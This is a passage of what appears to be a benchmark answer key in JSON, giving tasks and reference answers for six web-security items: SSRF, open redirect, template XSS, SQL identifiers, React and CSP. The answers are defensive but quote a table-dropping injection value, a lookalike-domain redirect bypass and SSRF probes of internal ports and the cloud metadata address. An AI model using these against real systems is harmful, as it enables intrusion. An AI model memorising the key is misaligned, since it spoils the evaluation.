+      "answer": "Blind SSRF in image downloader: even when response bodies are never returned to the attacker, the vulnerability remains exploitable. (1) Port scanning — the server's response time or error differs based on whether a port is open vs closed vs filtered, allowing the attacker to enumerate open ports on internal hosts: submit URLs pointing to internal:22, internal:3306, internal:6379 and infer open ports from timing. (2) Cloud metadata access — the background job fetches http://169.254.169.254/ and, though the body is never returned to the attacker, the data may be stored internally (cache, logs, database) where it can be retrieved later through a second vulnerability, or the mere act of fetching rotates credentials/triggers alerts. (3) SSRF-based denial of service — point at slow internal endpoints to exhaust the job worker pool. (4) Response smuggling via redirect chains. Two defensive controls: (a) Resolve and validate destination IPs against private/loopback/link-local blocklists before making the request; (b) Run the downloader in a network-isolated environment (container with no route to internal networks, only internet egress via proxy with allowlist).",
+      "tier": "T4",
+      "category": "security",
+      "task": "Blind SSRF in image downloader. Analyze the risk even when response bodies are never returned to the attacker and list two defensive controls."
+    },
+    "896": {
+      "id": 896,
+      "answer": "The distinction: SSRF means the server makes an outbound request to an attacker-controlled target. Open redirect means the server redirects the user's browser to an attacker-controlled URL. If the code does res.redirect(req.query.next) without validation, this is an open redirect — the server sends a 3xx response and the user's browser follows it. The user is sent to a phishing site, but the server does not make the HTTP request itself. If the server also fetches the URL server-side (e.g. to verify it), that adds SSRF. Safe version allowing only the two permitted domains: function safeRedirect(res, next) { let url; try { url = new URL(next); } catch { return res.redirect('/'); } const allowed = ['example.com', 'app.example.com']; if (!allowed.includes(url.hostname)) return res.redirect('/'); res.redirect(url.toString()); } Use a strict URL parser and compare hostname exactly — do not check if the URL contains the allowed domain as a substring (bypass: https://allowed.example.com.evil.com/).",
+      "tier": "T4",
+      "category": "security",
+      "task": "Open redirect vs SSRF distinction. Determine the issue type, justify, and write a safe version allowing redirects only to permitted domains."
+    },
+    "897": {
+      "id": 897,
+      "answer": "Vulnerable Flask code typically does: return f'<h1>{user_input}</h1>' or render_template_string('<h1>' + user_input + '</h1>') — the latter is especially dangerous as it allows Server-Side Template Injection (SSTI), not just XSS. Secure rewrite using Flask's built-in escaping: from flask import render_template_string, Markup; from markupsafe import escape; def show_content(user_input): safe = escape(user_input); return render_template_string('<h1>{{ content }}</h1>', content=safe). Better: use a template file where Jinja2 auto-escaping is enabled (default in Flask for .html templates): return render_template('content.html', content=user_input) — Jinja2 auto-escapes {{ content }} in HTML templates. Never use render_template_string with user content — even with | e filter there is risk of filter bypass. Never use Markup() to wrap user input — Markup() marks a string as safe and disables auto-escaping.",
+      "tier": "T4",
+      "category": "security",
+      "task": "Secure template rendering. Rewrite vulnerable Flask code to render user content safely using framework-supported escaping."
+    },
+    "898": {
+      "id": 898,
+      "answer": "The code is unsafe because table names (and column names) cannot be parameterized in SQL — placeholders only work for literal values in WHERE clauses, not for structural identifiers. If the code does: query = f'SELECT * FROM {table_name} WHERE id = %s' then executes with (user_id,), parameterizing the WHERE value does not protect the table name. An attacker supplies table_name = 'users; DROP TABLE secrets;--' and the table name is concatenated unsafely. Even if table_name passes through the DB driver as a parameter, most drivers do not support parameterized identifiers. Secure pattern for permitting only specific table names — strict allowlist: ALLOWED_TABLES = frozenset(['seifbenayed', 'profiles']); def get_from_table(table_name, user_id, cursor): if table_name not in ALLOWED_TABLES: raise ValueError(f'Table not permitted: {table_name}'); cursor.execute(f'SELECT * FROM {table_name} WHERE id = %s', (user_id,)). The allowlist contains literal identifier strings — any other input is rejected before query construction.",
+      "tier": "T4",
+      "category": "security",
+      "task": "Prepared statements across dynamic table names. Explain why the code remains unsafe even if values are parameterized, and show a secure pattern."
+    },
+    "899": {
+      "id": 899,
+      "answer": "React is NOT automatically safe. The component is vulnerable if it uses dangerouslySetInnerHTML: <div dangerouslySetInnerHTML={{__html: userContent}} />. This bypasses React's XSS protection and injects raw HTML. The prop name contains 'dangerous' deliberately to signal the risk. React's normal JSX rendering (e.g. <div>{userContent}</div>) DOES escape HTML entities and is safe for text. Vulnerability: dangerouslySetInnerHTML with unsan­itized user input allows stored/reflected XSS. Alternative 1 — plain text (safest): function Comment({text}) { return <div className=\"comment\">{text}</div>; } — React escapes text automatically; Alternative 2 — limited sanitized HTML using DOMPurify: import DOMPurify from 'dompurify'; function Comment({html}) { const clean = DOMPurify.sanitize(html, {ALLOWED_TAGS: ['b','i','em','strong','a'], ALLOWED_ATTR: ['href']}); return <div dangerouslySetInnerHTML={{__html: clean}} />; } DOMPurify removes script tags, event handlers, and javascript: URLs while preserving the allowed formatting tags.",
+      "tier": "T4",
+      "category": "security",
+      "task": "React security misconception. Determine if the component is vulnerable, explain why, and provide two secure alternatives."
+    },
+    "900": {
+      "id": 900,
+      "answer": "CSP does NOT fully prevent exploitation in this scenario. If the page contains inline scripts (e.g. event handlers like onclick=\"...\") or uses eval(), and the CSP allows 'unsafe-inline' or 'unsafe-eval', those are not protected. More specifically, if the CSP is something like Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline', the 'unsafe-inline' directive renders script-src restrictions useless — attackers can inject inline scripts. Additionally, CSP does not protect against: (1) DOM-based XSS that reads from URL fragments (no server interaction); (2) Injections into JSONP endpoints on allowed origins; (3) Data exfiltration via CSS injection or timing attacks if img-src is permissive. Code-level fix is always required alongside CSP. If the page uses inline event handler injection, the fix is to remove the unsafe inline code and replace with textContent (not innerHTML): element.textContent = userInput. CSP with nonces (script-src 'nonce-{random}') provides stronger protection than 'unsafe-inline' and prevents injected script blocks from executing, but it still does not fix DOM XSS. Both code-level sanitization and a strict CSP are required.",
+      "tier": "T4",
+      "category": "security",
+      "task": "CSP limits. Explain whether CSP fully prevents exploitation and why. Provide a code-level fix."
+    }
+  }
+}
